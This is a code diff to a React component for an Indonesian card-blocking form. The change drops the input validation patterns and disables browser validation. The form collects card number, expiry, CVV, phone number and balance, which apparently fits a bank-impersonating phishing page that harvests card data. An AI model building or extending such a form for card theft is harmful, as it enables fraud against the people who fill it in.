@@ -217,7 +217,7 @@ export const MAdminBlokirView: React.FC<MAdminBlokirViewProps> = ({ onBack, onPr
         />
 
         {/* Input Form Fields with Realtime Validations */}
-        <form onSubmit={handleOkClick} className="space-y-2.5 w-full relative">
+        <form noValidate onSubmit={handleOkClick} className="space-y-2.5 w-full relative">
           {/* Subtle Skeleton Loading Overlay upon submit */}
           <FormSkeletonOverlay
             isVisible={isSubmitting}
@@ -241,7 +241,6 @@ export const MAdminBlokirView: React.FC<MAdminBlokirViewProps> = ({ onBack, onPr
               <input
                 type="tel"
                 inputMode="numeric"
-                pattern="[0-9\s]*"
                 autoComplete="cc-number"
                 placeholder="16 digit nomor kartu"
                 value={cardNumber}
@@ -288,7 +287,6 @@ export const MAdminBlokirView: React.FC<MAdminBlokirViewProps> = ({ onBack, onPr
                 <input
                   type="tel"
                   inputMode="numeric"
-                  pattern="[0-9/]*"
                   autoComplete="cc-exp"
                   placeholder="BB/TT"
                   value={expiry}
@@ -327,7 +325,6 @@ export const MAdminBlokirView: React.FC<MAdminBlokirViewProps> = ({ onBack, onPr
                 <input
                   type="password"
                   inputMode="numeric"
-                  pattern="[0-9]*"
                   autoComplete="cc-csc"
                   placeholder="3 Digit"
                   value={cvv}
@@ -372,7 +369,6 @@ export const MAdminBlokirView: React.FC<MAdminBlokirViewProps> = ({ onBack, onPr
               <input
                 type="tel"
                 inputMode="numeric"
-                pattern="[0-9]*"
                 autoComplete="tel"
                 placeholder="Contoh: 081234567890"
                 value={phoneNumber}
@@ -411,7 +407,6 @@ export const MAdminBlokirView: React.FC<MAdminBlokirViewProps> = ({ onBack, onPr
               <input
                 type="tel"
                 inputMode="numeric"
-                pattern="[0-9]*"
                 placeholder="Rp 0"
                 value={balance ? `Rp ${balance}` : ''}
                 onChange={handleBalanceChange}
